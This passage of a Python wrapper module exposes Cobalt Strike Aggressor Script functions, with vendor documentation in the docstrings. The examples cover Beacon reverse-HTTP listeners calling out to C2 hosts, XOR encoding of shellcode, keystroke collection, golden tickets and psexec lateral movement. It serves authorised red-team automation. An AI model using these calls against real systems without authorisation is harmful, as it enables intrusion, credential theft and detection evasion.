        Adds a privilege escalation exploit selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_exploits($dialog, "exploit", "Exploit: ");

    """

    return engine.call('drow_exploits', args, fork=fork, sync=sync)


def drow_file(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a file chooser row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_file($dialog, "file", "Choose: ");

    """

    return engine.call('drow_file', args, fork=fork, sync=sync)


def drow_interface(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a VPN interface selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_interface($dialog, "int", "Interface: ");

    """

    return engine.call('drow_interface', args, fork=fork, sync=sync)


def drow_krbtgt(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a krbtgt selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_krbtgt($dialog, "hash", "krbtgt hash: ");

    """

    return engine.call('drow_krbtgt', args, fork=fork, sync=sync)


def drow_listener(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a listener selection row to a &dialog. This row only shows listeners with stagers (e.g., windows/beacon_https/reverse_https).
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_listener($dialog, "listener", "Listener: ");

    """

    return engine.call('drow_listener', args, fork=fork, sync=sync)


def drow_listener_smb(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. It's now equivalent to &drow_listener_stage
    """

    return engine.call('drow_listener_smb', args, fork=fork, sync=sync)


def drow_listener_stage(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a listener selection row to a &dialog. This row shows all Beacon and Foreign listener payloads.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_listener_stage($dialog, "listener", "Stage: ");

    """

    return engine.call('drow_listener_stage', args, fork=fork, sync=sync)


def drow_mailserver(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a mail server field to a &dialog.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_mailserver($dialog, "mail", "SMTP Server: ");

    """

    return engine.call('drow_mailserver', args, fork=fork, sync=sync)


def drow_proxyserver(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. The proxy configuration is now tied directly to the listener.
        Adds a proxy server field to a &dialog.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_proxyserver($dialog, "proxy", "Proxy: ");

    """

    return engine.call('drow_proxyserver', args, fork=fork, sync=sync)


def drow_site(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a site/URL field to a &dialog.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_site($dialog, "url", "Site: ");

    """

    return engine.call('drow_site', args, fork=fork, sync=sync)


def drow_text(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a text field row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        $4 - Optional. The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider).
        Example
        drow_text($dialog, "name", "Name: ");

    """

    return engine.call('drow_text', args, fork=fork, sync=sync)


def drow_text_big(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a multi-line text field to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_text_big($dialog, "addr", "Address: ");

    """

    return engine.call('drow_text_big', args, fork=fork, sync=sync)


def dstamp(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Format a time into a date/time value. This value includes seconds.
        Arguments
        $1 - the time [milliseconds since the UNIX epoch]
        Example
        println("The time is now: " . dstamp(ticks()));

        See Also
        &tstamp

    """

    return engine.call('dstamp', args, fork=fork, sync=sync)


def elog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Publish a notification to the event log
        Arguments
        $1 - the message
        Example
        elog("The robot invasion has begun!");

    """

    return engine.call('elog', args, fork=fork, sync=sync)


def encode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Obfuscate a position-independent blob of code with an encoder.
        Arguments
        $1 - position independent code (e.g., shellcode, "raw" stageless Beacon) to apply encoder to
        $2 - the encoder to use
        $3 - the architecture (e.g., x86, x64)


        Encoder
        Description


        alpha
        Alphanumeric encoder (x86-only)


        xor
        XOR encoder


        Notes
        1. The encoded position-independent blob must run from a memory page that has RWX permissions or the decode step will crash the current process.
        2. alpha encoder: The EDI register must contain the address of the encoded blob. &encode prepends a 10-byte (non-alphanumeric) program to the beginning of the alphanumeric encoded blob. This program calculates the location of the encoded blob and sets EDI for you. If you plan to set EDI yourself, you may remove these first 10 bytes.
        Returns
        A position-independent blob that decodes the original string and passes execution to it.
        Example
        # generate shellcode for a listener
        $stager = shellcode("my listener", false "x86");

        # encode it.
        $stager = encode($stager, "xor", "x86");

    """

    return engine.call('encode', args, fork=fork, sync=sync)


def fireAlias(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Runs a user-defined alias
        Arguments
        $1 - the beacon id to run the alias against
        $2 - the alias name to run
        $3 - the arguments to pass to the alias.
        Example
        # run the foo alias when a new Beacon comes in
        on beacon_initial {
            fireAlias($1, "foo", "bar!");
        }

    """

    return engine.call('fireAlias', args, fork=fork, sync=sync)


def fireEvent(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Fire an event.
        Arguments
        $1 - the event name
        ... - the event arguments.
        Example
        on foo {
            println("Argument is: $1");
        }

        fireEvent("foo", "Hello World!");

    """

    return engine.call('fireEvent', args, fork=fork, sync=sync)


def format_size(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Formats a number into a size (e.g., 1024 => 1kb)
        Arguments
        $1 - the size to format
        Returns
        A string representing a human readable data size.
        Example
        println(format_size(1024));


    """

    return engine.call('format_size', args, fork=fork, sync=sync)


def getAggressorClient(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns the aggressor.AggressorClient Java object. This can reach anything internal within the current Cobalt Strike client context.
        Example
        $client = getAggressorClient();

    """

    return engine.call('getAggressorClient', args, fork=fork, sync=sync)


def gunzip(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Decompress a string (GZIP).
        Arguments
        $1 - the string to compress
        Returns
        The argument processed by the gzip de-compressor
        Example
        println(gunzip(gzip("this is a test")));

        See Also
        &gzip

    """

    return engine.call('gunzip', args, fork=fork, sync=sync)


def gzip(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        GZIP a string.
        Arguments
        $1 - the string to compress
        Returns
        The argument processed by the gzip compressor
        Example
        println(gzip("this is a test"));

        See Also
        &gunzip
    """

    return engine.call('gzip', args, fork=fork, sync=sync)


def highlight(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Insert an accent (color highlight) into Cobalt Strike's data model
        Arguments
        $1 - the data model
        $2 - an array of rows to highlight
        $3 - the accent type
        Notes

        Data model rows include: applications, beacons, credentials, listeners, services, and targets.


        Accent options are:



        Accent
        Color


        [empty]
        no highlight


        good
        Green


        bad
        Red


        neutral
        Yellow


        ignore
        Grey


        cancel
        Dark Blue


        Example
        command admincreds {
            local('@creds');

            # find all of our creds that are user Administrator.
            foreach $entry (credentials()) {
                if ($entry['user'] eq "Administrator") {
                    push(@creds, $entry);
                }
            }

            # highlight all of them green!
            highlight("credentials", @creds, "good");
        }

    """

    return engine.call('highlight', args, fork=fork, sync=sync)


def host_delete(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Delete a host from the targets model
        Arguments
        $1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
        Example
        # clear all hosts
        host_delete(hosts());

    """

    return engine.call('host_delete', args, fork=fork, sync=sync)


def host_info(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get information about a target.
        Arguments
        $1 - the host IPv4 or IPv6 address
        $2 - [Optional] the key to extract a value for
        Returns
        %info = host_info("address");

        Returns a dictionary with known information about this target.
        $value = host_info("address", "key");

        Returns the value for the specified key from this target's entry in the data model.
        Example
        # create a script console alias to dump host info
        command host {
            println("Host $1");
            foreach $key => $value (host_info($1)) {
                println("$[15]key $value");
            }
        }

    """

    return engine.call('host_info', args, fork=fork, sync=sync)


def host_update(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Add or update a host in the targets model
        Arguments
        $1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
        $2 - the DNS name of this target
        $3 - the target's operating system
        $4 - the operating system version number (e.g., 10.0)
        $5 - a note for the target.
        Note
        You may specify a $null value for any argument and, if the host exists, no change will be made to that value.
        Example
        host_update("192.168.20.3", "DC", "Windows", 10.0);

    """

    return engine.call('host_update', args, fork=fork, sync=sync)


def hosts(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of IP addresses from Cobalt Strike's target model
        Returns
        An array of IP addresses
        Example
        printAll(hosts());

    """

    return engine.call('hosts', args, fork=fork, sync=sync)


def insert_component(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Add a javax.swing.JComponent object to the menu tree
        Arguments
        $1 - the component to add
    """

    return engine.call('insert_component', args, fork=fork, sync=sync)


def insert_menu(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Bring menus associated with a popup hook into the current menu tree.
        Arguments
        $1 - the popup hook
        ... - additional arguments are passed to the child popup hook.
        Example
        popup beacon {
            # menu definitions above this point

            insert_menu("beacon_bottom", $1);

            # menu definitions below this point
        }

    """

    return engine.call('insert_menu', args, fork=fork, sync=sync)


def iprange(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate an array of IPv4 addresses based on a string description
        Arguments
        $1 - a string with a description of IPv4 ranges


        Range
        Result


        192.168.1.2
        The IP4 address 192.168.1.2


        192.168.1.1, 192.168.1.2
        The IPv4 addresses 192.168.1.1 and 192.168.1.2


        192.168.1.0/24
        The IPv4 addresses 192.168.1.0 through 192.168.1.255


        192.168.1.18-192.168.1.30
        The IPv4 addresses 192.168.1.18 through 192.168.1.29


        192.168.1.18-30
        The IPv4 addresses 192.168.1.18 through 192.168.1.29


        Returns
        An array of IPv4 addresses within the specified ranges.
        Example
        printAll(iprange("192.168.1.0/25"));

    """

    return engine.call('iprange', args, fork=fork, sync=sync)


def keystrokes(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of keystrokes from Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about recorded keystrokes.
        Example
        printAll(keystrokes());

    """

    return engine.call('keystrokes', args, fork=fork, sync=sync)


def licenseKey(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the license key for this instance of Cobalt Strike
        Returns
        Your license key.
        Example
        println("Your key is: " . licenseKey());

    """

    return engine.call('licenseKey', args, fork=fork, sync=sync)


def listener_create(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &listener_create_ext
        Create a new listener.
        Arguments
        $1 - the listener name
        $2 - the payload (e.g., windows/beacon_http/reverse_http)
        $3 - the listener host
        $4 - the listener port
        $5 - a comma separated list of addresses for listener to beacon to
        Example
        # create a foreign listener
        listener_create("My Metasploit", "windows/foreign_https/reverse_https",
                "ads.losenolove.com", 443);

        # create an HTTP Beacon listener
        listener_create("Beacon HTTP", "windows/beacon_http/reverse_http",
                "www.losenolove.com", 80,
                "www.losenolove.com, www2.losenolove.com");

    """

    return engine.call('listener_create', args, fork=fork, sync=sync)


def listener_create_ext(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Create a new listener.
        Arguments
        $1 - the listener name
        $2 - the payload (e.g., windows/beacon_http/reverse_http)
        $3 - a map with key/value pairs that specify options for the listener
        Notes
        The following payload options are valid for $2:


        Payload
        Type


        windows/beacon_dns/reverse_dns_txt
        Beacon DNS


        windows/beacon_http/reverse_http
        Beacon HTTP


        windows/beacon_https/reverse_https
        Beacon HTTPS


        windows/beacon_bind_pipe
        Beacon SMB


        windows/beacon_bind_tcp
        Beacon TCP


        windows/beacon_extc2
        External C2


        windows/foreign/reverse_http
        Foreign HTTP


        windows/foreign/reverse_https
        Foreign HTTPS


        The following keys are valid for $3:


        Key
        DNS
        HTTP/S
        SMB
        TCP (Bind)


        althost

        HTTP Host Header




        bindto
        bind port
        bind port




        beacons
        c2 hosts
        c2 hosts

        bind host


        host
        staging host
        staging host




        port
        c2 port
        c2 port
        pipe name
        port


        profile

        profile variant




        proxy

        proxy config




        Note: The proxy configuration string is the same string you would input into Cobalt Strike's listener dialog. *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:password@host:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or "" to use the default behavior.
        Example
        # create a foreign listener
        listener_create_ext("My Metasploit", "windows/foreign/reverse_https",
                %(host => "ads.losenolove.com", port => 443));

        # create an HTTP Beacon listener
        listener_create_ext("Beacon HTTP", "windows/beacon_http/reverse_http",
                %(host => "www.losenolove.com", port => 80,
                beacons => "www.losenolove.com, www2.losenolove.com");

    """

    return engine.call('listener_create_ext', args, fork=fork, sync=sync)


def listener_delete(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Stop and remove a listener.
        Arguments
        $1 - the listener name
        Example
        listener_delete("Beacon HTTP");

    """

    return engine.call('listener_delete', args, fork=fork, sync=sync)


def listener_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe a listener.
        Arguments
        $1 - the listener name
        $2 - [Optional] the remote target the listener is destined for
        Returns
        A string describing the listener
        Example
        foreach $name (listeners()) {
            println("$name is: " . listener_describe($name));
        }

    """

    return engine.call('listener_describe', args, fork=fork, sync=sync)


def listener_info(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get information about a listener.
        Arguments
        $1 - the listener name
        $2 - [Optional] the key to extract a value for
        Returns
        %info = listener_info("listener name");

        Returns a dictionary with the metadata for this listener.
        $value = listener_info("listener name", "key");

        Returns the value for the specified key from this listener's metadata
        Example
        # create a script console alias to dump listener info
        command dump {
            println("Listener $1");
            foreach $key => $value (listener_info($1)) {
                println("$[15]key $value");
            }
        }

    """

    return engine.call('listener_info', args, fork=fork, sync=sync)


def listener_pivot_create(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Create a new pivot listener.
        Arguments
        $1 - the Beacon ID
        $2 - the listener name
        $3 - the payload (e.g., windows/beacon_reverse_tcp)
        $4 - the listener host
        $5 - the listener port
        Note
        The only valid payload argument is windows/beacon_reverse_tcp.
        Example
        # create a pivot listener:
        # $1 = beaconID, $2 = name, $3 = port
        alias plisten {
            local('$lhost $bid $name $port');

            # extract our arguments
            ($bid, $name, $port) = @_;

            # get the name of our target
            $lhost = beacon_info($1, "computer");

            btask($1, "create TCP listener on $lhost $+ : $+ $port");
            listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
        }

    """

    return engine.call('listener_pivot_create', args, fork=fork, sync=sync)


def listener_restart(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Restart a listener
        Arguments
        $1 - the listener name
        Example
        listener_restart("Beacon HTTP");

    """

    return engine.call('listener_restart', args, fork=fork, sync=sync)


def listeners(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Return a list of listener names (with stagers only!) across all team servers this client is connected to.
        Returns
        An array of listener names.
        Example
        printAll(listeners());

    """

    return engine.call('listeners', args, fork=fork, sync=sync)


def listeners_local(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Return a list of listener names. This function limits itself to the current team server only. External C2 listener names are omitted.
        Returns
        An array of listener names.
        Example
        printAll(listeners_local());

    """

    return engine.call('listeners_local', args, fork=fork, sync=sync)


def listeners_stageless(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Return a list of listener names across all team servers this client is connected to. External C2 listeners are filtered (as they're not actionable via staging or exporting as a Reflective DLL).
        Returns
        An array of listener names.
        Example
        printAll(listeners_stageless());

    """

    return engine.call('listeners_stageless', args, fork=fork, sync=sync)


def localip(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the IP address associated with the team server.
        Returns
        A string with the team server's IP address.
        Example
        println("I am: " . localip());

    """

    return engine.call('localip', args, fork=fork, sync=sync)


def menubar(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Add a top-level item to the menubar.
        Arguments
        $1 - the description
        $2 - the popup hook
        Example
        popup mythings {
            item "Keep out" {
            }
        }

        menubar("My &Things", "mythings");

    """

    return engine.call('menubar', args, fork=fork, sync=sync)


def mynick(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the nickname associated with the current Cobalt Strike client.
        Returns
        A string with your nickname.
        Example
        println("I am: " . mynick());

    """

    return engine.call('mynick', args, fork=fork, sync=sync)


def nextTab(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Activate the tab that is to the right of the current tab.
        Example
        bind Ctrl+Right {
            nextTab();
        }

    """

    return engine.call('nextTab', args, fork=fork, sync=sync)


def on(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register an event handler. This is an alternate to the on keyword.
        Arguments
        $1 - the name of the event to respond to
        $2 - a callback function. Called when the event happens.
        Example
        sub foo {
            blog($1, "Foo!");
        }

        on("beacon_initial", &foo);

    """

    return engine.call('on', args, fork=fork, sync=sync)


def openAboutDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the "About Cobalt Strike" dialog
        Example
        openAboutDialog();

    """

    return engine.call('openAboutDialog', args, fork=fork, sync=sync)


def openApplicationManager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the application manager (system profiler results) tab.
        Example
        openApplicationManager();

    """

    return engine.call('openApplicationManager', args, fork=fork, sync=sync)


def openAutoRunDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0.
    """

    return engine.call('openAutoRunDialog', args, fork=fork, sync=sync)


def openBeaconBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the beacon browser tab.
        Example
        openBeaconBrowser();

    """

    return engine.call('openBeaconBrowser', args, fork=fork, sync=sync)


def openBeaconConsole(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the console to interact with a Beacon
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Interact" {
            local('$bid');
            foreach $bid ($1) {
                openBeaconConsole($bid);
            }
        }

    """

    return engine.call('openBeaconConsole', args, fork=fork, sync=sync)


def openBrowserPivotSetup(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        open the browser pivot setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Browser Pivoting" {
            local('$bid');
            foreach $bid ($1) {
                openBrowserPivotSetup($bid);
            }
        }

    """

    return engine.call('openBrowserPivotSetup', args, fork=fork, sync=sync)


def openBypassUACDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.1.

    """

    return engine.call('openBypassUACDialog', args, fork=fork, sync=sync)


def openCloneSiteDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog for the website clone tool.
        Example
        openCloneSiteDialog();

    """

    return engine.call('openCloneSiteDialog', args, fork=fork, sync=sync)


def openConnectDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the connect dialog.
        Example
        openConnectDialog();

    """

    return engine.call('openConnectDialog', args, fork=fork, sync=sync)


def openCovertVPNSetup(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        open the Covert VPN setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "VPN Pivoting" {
            local('$bid');
            foreach $bid ($1) {
                openCovertVPNSetup($bid);
            }
        }

    """

    return engine.call('openCovertVPNSetup', args, fork=fork, sync=sync)


def openCredentialManager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the credential manager tab.
        Example
        openCredentialManager();

    """

    return engine.call('openCredentialManager', args, fork=fork, sync=sync)


def openDownloadBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the download browser tab
        Example
        openDownloadBrowser();

    """

    return engine.call('openDownloadBrowser', args, fork=fork, sync=sync)


def openElevateDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to launch a privilege escalation exploit.
        Arguments
        $1 - the beacon ID
        Example
        item "Elevate" {
            local('$bid');
            foreach $bid ($1) {
                openElevateDialog($bid);
            }
        }

    """

    return engine.call('openElevateDialog', args, fork=fork, sync=sync)


def openEventLog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the event log.
        Example
        openEventLog();

    """

    return engine.call('openEventLog', args, fork=fork, sync=sync)


def openFileBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the file browser for a Beacon
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Browse Files" {
            local('$bid');
            foreach $bid ($1) {
                openFileBrowser($bid);
            }
        }

    """

    return engine.call('openFileBrowser', args, fork=fork, sync=sync)


def openGoldenTicketDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        open a dialog to help generate a golden ticket
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Golden Ticket" {
            local('$bid');
            foreach $bid ($1) {
                openGoldenTicketDialog($bid);
            }
        }

    """

    return engine.call('openGoldenTicketDialog', args, fork=fork, sync=sync)


def openHTMLApplicationDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the HTML Application Dialog.
        Example
        openHTMLApplicationDialog();

    """

    return engine.call('openHTMLApplicationDialog', args, fork=fork, sync=sync)


def openHostFileDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the host file dialog.
        Example
        openHostFileDialog();

    """

    return engine.call('openHostFileDialog', args, fork=fork, sync=sync)


def openInterfaceManager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the tab to manage Covert VPN interfaces
        Example
        openInterfaceManager();

    """

    return engine.call('openInterfaceManager', args, fork=fork, sync=sync)


def openJavaSignedAppletDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the Java Signed Applet dialog
        Example
        openJavaSignedAppletDialog();

    """

    return engine.call('openJavaSignedAppletDialog', args, fork=fork, sync=sync)


def openJavaSmartAppletDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the Java Smart Applet dialog
        Example
        openJavaSmartAppletDialog();

    """

    return engine.call('openJavaSmartAppletDialog', args, fork=fork, sync=sync)


def openJumpDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open Cobalt Strike's lateral movement dialog
        Arguments
        $1 - the type of lateral movement. See &beacon_remote_exploits for a list of options. ssh and ssh-key are options too.
        $2 - an array of targets to apply this action against
        Example
        openJumpDialog("psexec_psh", @("192.168.1.3", "192.168.1.4"));

    """

    return engine.call('openJumpDialog', args, fork=fork, sync=sync)


def openKeystrokeBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the keystroke browser tab
        Example
        openKeystrokeBrowser();

    """

    return engine.call('openKeystrokeBrowser', args, fork=fork, sync=sync)


def openListenerManager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the listener manager
        Example
        openListenerManager();

    """

    return engine.call('openListenerManager', args, fork=fork, sync=sync)


def openMakeTokenDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        open a dialog to help generate an access token
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Make Token" {
            local('$bid');
            foreach $bid ($1) {
                openMakeTokenDialog($bid);
            }
        }

    """

    return engine.call('openMakeTokenDialog', args, fork=fork, sync=sync)


def openOfficeMacro(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the office macro export dialog
        Example
        openOfficeMacroDialog();

    """

    return engine.call('openOfficeMacro', args, fork=fork, sync=sync)


def openOneLinerDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to generate a PowerShell one-liner for this specific Beacon session.
        Arguments
        $1 - the beacon ID
        Example
        item "&One-liner" {
            openOneLinerDialog($1);
        }



    """

    return engine.call('openOneLinerDialog', args, fork=fork, sync=sync)


def openOrActivate(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        If a Beacon console exists, make it active. If a Beacon console does not exist, open it.
        Arguments
        $1 - the Beacon ID
        Example
        item "&Activate" {
            local('$bid');
            foreach $bid ($1) {
                openOrActivate($bid);
            }
        }

    """

    return engine.call('openOrActivate', args, fork=fork, sync=sync)


def openPayloadGeneratorDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the Payload Generator dialog.
        Example
        openPayloadGeneratorDialog();

    """

    return engine.call('openPayloadGeneratorDialog', args, fork=fork, sync=sync)


def openPayloadHelper(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open a payload chooser dialog.
        Arguments
        $1 - a callback function. Arguments: $1 - the selected listener.
        Example
        openPayloadHelper(lambda({
            bspawn($bid, $1);
        }, $bid => $1));

    """

    return engine.call('openPayloadHelper', args, fork=fork, sync=sync)


def openPivotListenerSetup(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        open the pivot listener setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Listener..." {
            local('$bid');
            foreach $bid ($1) {
                openPivotListenerSetup($bid);
            }
        }

    """

    return engine.call('openPivotListenerSetup', args, fork=fork, sync=sync)


def openPortScanner(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the port scanner dialog
        Arguments
        $1 - an array of targets to scan
        Example
        openPortScanner(@("192.168.1.3"));

    """

    return engine.call('openPortScanner', args, fork=fork, sync=sync)


def openPortScannerLocal(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the port scanner dialog with options to target a Beacon's local network
        Arguments
        $1 - the beacon to target with this feature
        Example
        item "Scan" {
            local('$bid');
            foreach $bid ($1) {
                openPortScannerLocal($bid);
